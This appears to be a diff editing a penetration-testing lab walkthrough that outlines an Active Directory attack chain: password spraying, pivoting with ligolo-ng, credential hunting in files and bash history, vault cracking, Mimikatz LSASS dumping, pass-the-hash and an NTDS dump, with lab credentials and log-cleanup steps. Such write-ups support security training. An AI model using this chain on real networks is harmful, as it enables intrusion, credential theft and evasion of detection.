@@ -4,13 +4,13 @@
 
 ---
 
-## TL;DR Flow
-1) **Username generation** → **Password spray (SSH)** → **Foothold on DMZ01**  \
-2) **Drop ligolo-ng** → **Pivot 172.16.119.0/24**  \
-3) **Spray RDP/WinRM/SMB** with discovered creds → **RDP to JUMP01**  \
-4) **Hunt shares with Snaffler** → **Pull `.psafe3`** → **Crack with hashcat**  \
-5) **New creds** → **Admin RDP on JUMP01** → **Mimikatz LSASS** → **Get user NTLM**  \
-6) **Pass-the-Hash to DC01** → **`--ntds` dump** → **Administrator hash**  \
+## Flow
+1) **Username generation** → **Password spray (SSH)** → **Foothold on DMZ01**
+2) **Drop ligolo-ng** → **Pivot 172.16.119.0/24**
+3) **Spray RDP/WinRM/SMB** with discovered creds → **RDP to JUMP01**
+4) **Hunt shares with Snaffler** → **Pull `.psafe3`** → **Crack with hashcat**
+5) **New creds** → **Admin RDP on JUMP01** → **Mimikatz LSASS** → **Get user NTLM**
+6) **Pass-the-Hash to DC01** → **`--ntds` dump** → **Administrator hash**
 7) **Housekeeping** (remove tools, logs, tunnels)
 
 References: username-anarchy, hydra, ligolo-ng, netexec (nxc), xfreerdp, Snaffler, smbclient, hashcat, mimikatz.
@@ -48,7 +48,7 @@ Look for a valid pair like `jbetty:Texas123!@#`. Then:
 ```bash
 ssh jbetty@10.129.234.116
 ```
-Tip: throttle if needed (`-t 4`). fileciteturn0file0
+Tip: throttle if needed (`-t 4`).
 
 ### Immediate local triage
 ```bash
@@ -57,7 +57,7 @@ grep -riE 'pass|cred|key|pw|secret' /home/ 2>/dev/null
 # Or inspect bash history quickly
 sed -n '1,200p' ~/.bash_history
 ```
-Expect a one-liner revealing **sshpass** to `FILE01` (e.g., `hwilliam:dealer-screwed-gym1`). fileciteturn0file0
+Expect a one-liner revealing **sshpass** to `FILE01` (e.g., `hwilliam:dealer-screwed-gym1`).
 
 ---
 
@@ -107,7 +107,7 @@ xfreerdp /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' \
 ```
 ---
 
-## Share Hunting (Snaffler) → Vault Pull
+## Share Hunting (Snaffler) Vault Pull
 ### Enumerate shares
 ```bash
 nxc smb hosts -u hwilliam -p 'dealer-screwed-gym1' --shares
@@ -175,7 +175,7 @@ Mission complete.
 
 ---
 
-## Quick Reference — Commands
+## Quick Reference
 ```bash
 # Username & spray
 ./username-anarchy "First Last" > user.list
